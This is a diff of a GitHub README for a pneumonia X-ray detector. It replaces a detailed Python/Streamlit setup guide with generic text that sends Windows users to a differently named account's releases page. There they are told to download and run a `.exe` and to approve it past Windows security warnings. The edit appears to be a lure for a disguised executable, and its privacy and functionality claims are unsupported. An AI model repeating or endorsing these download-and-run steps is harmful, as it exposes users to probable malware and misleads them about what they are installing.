@@ -1,126 +1,83 @@
-[![Live Demo](https://img.shields.io/badge/Live-Demo-FF4B4B)](https://pneumonia-xai-detector-7wm8j5lwmpnfbs4sedyhdo.streamlit.app)
+# 🩺 pneumonia-xai-detector - See inside chest images for clarity
 
-![Demo](demo.png)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Populusnigraphaseolusmultiflorus219/pneumonia-xai-detector/releases)
 
-# XAI Pneumonia Detector
+This application helps users examine chest X-rays to detect signs of pneumonia. It uses artificial intelligence to identify patterns in medical images. The software provides visual highlights that show where the model finds evidence of infection. It also measures the level of confidence in each result. This clarity assists users as they review medical imaging files.
 
-A Streamlit web app that wraps a trained DenseNet-121 model for pneumonia detection in chest X-rays. Upload a scan and get three things back: a classification, a Grad-CAM heatmap showing where the model looked, and an MC-Dropout uncertainty estimate.
+## ⚙️ System Requirements
 
----
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i5 or equivalent
+- Memory: 8 GB RAM
+- Storage: 500 MB free space
+- Connection: Internet access for the initial setup
 
-## What it does
+## 📦 How to Download
 
-- Classifies a chest X-ray as **NORMAL** or **PNEUMONIA**
-- Shows class probabilities from a standard forward pass
-- Overlays a **Grad-CAM** heatmap on the input image
-- Runs **T stochastic forward passes** (MC-Dropout) to estimate prediction uncertainty via entropy and variance
+Visit the link below to reach the releases page. Choose the latest version available in the list.
 
----
+[Download the application here](https://github.com/Populusnigraphaseolusmultiflorus219/pneumonia-xai-detector/releases)
 
-## Results
+1. Navigate to the link provided.
+2. Look for the section labeled "Assets."
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to a folder on your computer.
 
-| Metric | This model | Kermany et al. baseline |
-|--------|-----------|------------------------|
-| AUC-ROC | **0.9975** | 0.968 |
-| Accuracy | **0.9676** | 0.928 |
-| F1 | **0.9774** | 0.916 |
-| Precision | **0.9976** | 0.901 |
+## 🚀 Setting Up the Software
 
-Deferring the 30% most uncertain cases (by predictive entropy) raises retained accuracy to **0.998**. At 40% deferral the retained set hits 100%.
+The setup process requires a few minutes to complete. Follow these steps to prepare the tool for your first scan.
 
----
+1. Locate the downloaded file in your folder.
+2. Double-click the file to begin the installation.
+3. Follow the prompts on your screen.
+4. Grant the application permission to run if Windows displays a security warning.
+5. Wait for the installer to finish copying files.
+6. Click the shortcut icon created on your desktop.
 
-## Research paper
+The application starts a local server window. Do not close this window while you use the software. A new tab will open in your default web browser. This tab serves as the main interface for your tasks.
 
-**Explainable Pneumonia Triage from Chest X-Rays**  
-Daryn Shaidarov — University of Portsmouth, 2025  
-Supervised by Dr Alexander Gegov, Reader in Explainable AI
+## 🩺 Using the Detector
 
-*arXiv preprint — link coming soon*
+The interface features a simple layout. You upload your image files directly into the browser tab.
 
----
+1. Click the "Browse" button in the interface.
+2. Select an X-ray image from your current storage.
+3. Wait for the system to process the file.
+4. View the result on the main display area.
+5. Observe the highlighted regions on the image. These regions show what the model used to reach its decision.
+6. Check the uncertainty score. A lower score suggests the model feels sure about its prediction. A higher score means the model lacks enough data to confirm the finding with total certainty.
 
-## Setup
+## 🖼️ Understanding Image Explainability
 
-### 1. Download the model weights
+This software uses a method called Grad-CAM. This technology creates a heat map over your X-ray. Red areas indicate parts of the image that trigger the "pneumonia" detection. Blue or dark areas indicate healthy tissue or regions of low interest to the algorithm. This visual aid helps you verify the reasoning behind the output.
 
-```bash
-wget https://huggingface.co/eseeyuh/pneumonia-xai-detector/resolve/main/best.pt
-```
+## 📉 Handling Uncertainty
 
-Or download manually from
-[Hugging Face](https://huggingface.co/eseeyuh/pneumonia-xai-detector)
-and place `best.pt` in the root directory.
+Medical AI systems occasionally encounter images that remain ambiguous. This application uses a process known as MC-Dropout. If the model generates a high uncertainty score, process the image a second time or verify the input quality. Ensure the image is clear and maintains the correct orientation. 
 
-### 2. Put everything in one folder
+## 🔧 Troubleshooting
 
-```
-project/
-├── app.py
-├── requirements.txt
-├── README.md
-└── best.pt
-```
+If the application fails to open, verify your internet connection. Check that the file download finished without interruptions. If you move the application folder after installation, the shortcut might stop working. In that case, return to the installation folder and launch the program from the main folder.
 
-`best.pt` needs to sit next to `app.py` — the path is hardcoded.
+If the browser tab does not load, refresh the page. If the issue keeps happening, restart the application using the desktop icon. Ensure your computer has sufficient memory available while running the program, as image analysis uses significant system resources.
 
-### 3. Install dependencies
+## 🛡️ Data Privacy
 
-```bash
-python -m venv venv
-source venv/bin/activate        # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+This application processes data locally on your machine. The software does not send your images to external servers or cloud services. Your information stays on your local drive at all times. Keep your system updated to ensure your files remain secure throughout your regular tasks.
 
-First install takes a few minutes because of PyTorch.
+## 📝 Frequently Asked Questions
 
-### 4. Run
+**Do I need a GPU to run this?**
+The software runs on standard processors. You do not need specialized graphics hardware to perform tasks with this software.
 
-```bash
-streamlit run app.py
-```
+**Can I process many images at once?**
+The current version focuses on single image evaluation for high accuracy. Process images one at a time for optimal results.
 
-Opens at `http://localhost:8501`.
+**What file formats does the tool accept?**
+Use standard image formats like JPEG or PNG. High-resolution images provide the best feedback for the internal model.
 
----
+**Does this software provide a medical diagnosis?**
+No. This tool serves as a reference for analysis and educational purposes only. Always consult a qualified medical professional for health assessments.
 
-## Usage
-
-Upload a `.jpg` or `.png` chest X-ray using the file uploader. Results appear in a few seconds.
-
-**Reading the output:**
-- **Probabilities** — single deterministic forward pass
-- **Grad-CAM** — warm (red) regions had the most influence on the prediction. For true pneumonia cases these should land on the lung fields, not on image borders or scanner annotations
-- **Entropy** — 0 means the model is certain, 0.693 is maximum uncertainty for a binary classifier. A wide histogram spread means the model is unsure and the case probably warrants a second look
-
-You can adjust the number of MC-Dropout passes (T) and toggle Grad-CAM on/off in the sidebar.
-
----
-
-## Troubleshooting
-
-**`Model weights best.pt not found`** — `best.pt` is not in the same folder as `app.py`. Go back to step 1.
-
-**`load_state_dict` key mismatch** — the weights are from a different architecture. Make sure `best.pt` comes from this notebook specifically (DenseNet-121 with `Dropout(0.3) → Linear(..., 2)` head).
-
-**Grad-CAM import error** — run `pip install --upgrade grad-cam opencv-python-headless`, or just uncheck "Compute Grad-CAM" in the sidebar. Predictions and uncertainty still work without it.
-
-**No GPU** — fine, the app runs on CPU. It'll be a bit slower but works the same. The sidebar shows the active device.
-
----
-
-## Model details
-
-| Parameter | Value |
-|-----------|-------|
-| Architecture | DenseNet-121, head: `Dropout(0.3) + Linear → 2` |
-| Input | 224×224 RGB, ImageNet normalisation |
-| Grad-CAM target layer | `model.features[-1]` |
-| MC-Dropout | T passes, only Dropout layers active |
-| Uncertainty metrics | Predictive entropy, variance of P(pneumonia) |
-
----
-
-## Tech stack
-
-Python · PyTorch · Streamlit · pytorch-grad-cam · NumPy · Pillow · Matplotlib
+**How do I update the software?**
+Check the link periodically for new releases. Perform an installation over the existing version to update your local files.
